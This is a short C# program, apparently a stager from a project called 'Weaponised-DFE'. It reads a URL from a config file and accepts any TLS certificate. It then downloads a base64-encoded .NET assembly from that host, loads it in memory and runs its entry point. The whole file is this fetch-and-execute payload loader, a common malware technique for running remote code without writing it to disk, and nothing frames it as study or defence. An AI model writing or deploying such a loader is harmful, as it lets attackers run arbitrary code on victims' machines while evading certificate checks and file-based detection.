using System;
using System.Net;
using System.Net.Http;
using System.Reflection;
using System.Text.RegularExpressions;
using System.IO;

string configPath = Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "Weaponised-DFE", "config.ini");
string configContent = File.ReadAllText(configPath);
string url = Regex.Match(configContent, @"url=\[(.*?)\]").Groups[1].Value;

var cookieContainer = new CookieContainer();
cookieContainer.Add(new Uri(url), new Cookie("sessionID", cookieValue));

HttpClientHandler handler = new HttpClientHandler
{
    CookieContainer = cookieContainer,
    ServerCertificateCustomValidationCallback = (message, cert, chain, sslPolicyErrors) => true
};

HttpClient client = new HttpClient(handler);
HttpResponseMessage resp = client.GetAsync(url).Result;
string b64Exe = resp.Content.ReadAsStringAsync().Result;

byte[] exe = Convert.FromBase64String(b64Exe);

Assembly asm = Assembly.Load(exe);
MethodInfo entry = asm.EntryPoint;

if (entry != null)
{
    if (entry.GetParameters().Length == 0)
    {
        entry.Invoke(null, null);
    }
    else
    {
        entry.Invoke(null, new object[] { new string[] { } });
    }
}
else
{
    Console.WriteLine("Error: No entry point found.");
}
